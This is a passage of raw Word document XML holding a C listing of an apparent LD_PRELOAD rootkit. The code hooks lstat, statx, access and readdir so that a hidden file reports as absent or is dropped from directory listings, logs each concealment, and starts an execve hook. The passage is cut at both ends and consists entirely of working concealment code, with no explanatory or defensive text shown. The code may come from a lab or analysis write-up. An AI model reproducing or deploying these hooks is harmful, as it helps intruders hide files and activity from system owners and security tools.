    <w:p w14:paraId="7FCAE2D5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256D1432" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return real_lstat(pathname, statbuf);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64AC7DBB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48605848" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3327AAD5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>int statx(int dirfd, const char *pathname, int flags, unsigned int mask, struct statx *statxbuf)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D17DB4" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D03170" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static int (*real_statx)(int, const char *, int, unsigned int, struct statx *) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0587BA" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B34D5F1" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_statx == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1500638F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_statx = dlsym(RTLD_NEXT, "statx");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF812BB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (!in_hook &amp;&amp; is_hidden_path(pathname)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F3691A" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A13C3C3" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rk_log("statx(%d, \"%s\") BLOCKED -&gt; ENOENT (concealed)", dirfd, pathname);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634A0E51" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B142AA5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        errno = ENOENT;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB4C107" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return -1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145DEF28" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AC7B30" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return real_statx(dirfd, pathname, flags, mask, statxbuf);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFEE057" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F145D8" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641139F2" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>int access(const char *pathname, int mode)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E8E7E3" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1914A351" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static int (*real_access)(const char *, int) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CA2893" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31837A8D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_access == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C014353" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_access = dlsym(RTLD_NEXT, "access");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7780814B" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (!in_hook &amp;&amp; is_hidden_path(pathname)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17ED18A7" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD782A0" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rk_log("access(\"%s\") BLOCKED -&gt; ENOENT (concealed)", pathname);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FBB2AA9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A607D05" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        errno = ENOENT;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A90AAC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return -1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0B4ADD" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E43ED15" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return real_access(pathname, mode);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEB0E94" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9B1656" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB4C186" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/* ---------- directory listing: readdir (concealment) ---------- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33711B2E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>struct dirent *readdir(DIR *dirp)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152C83F6" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CF3C72" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static struct dirent *(*real_readdir)(DIR *) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144ED794" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    struct dirent *entry;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB10D67" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="365BEA95" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_readdir == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F431883" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_readdir = dlsym(RTLD_NEXT, "readdir");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C10573F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EFD6E4" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    while ((entry = real_readdir(dirp)) != NULL) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7113BBD9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if (strcmp(entry-&gt;d_name, HIDDEN_FILE) == 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1A5790" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169E002A" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            rk_log("readdir: concealed entry \"%s\"", entry-&gt;d_name);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4678FE5C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC2E49E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            continue;              /* pretend it is not there */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C94908" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72038441" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF5B557" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3A8AAB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return entry;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE6A794" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B78A24" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373B7BD1" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/* ---------- process execution monitoring ---------- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0009DA9F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>int execve(const char *pathname, char *const argv[], char *const envp[])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1514A323" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C330FC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static int (*real_execve)(const char *, char *const[], char *const[]) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023B0EAF" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EAEF663" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_execve == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092F1142" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_execve = dlsym(RTLD_NEXT, "execve");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB5BA8F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
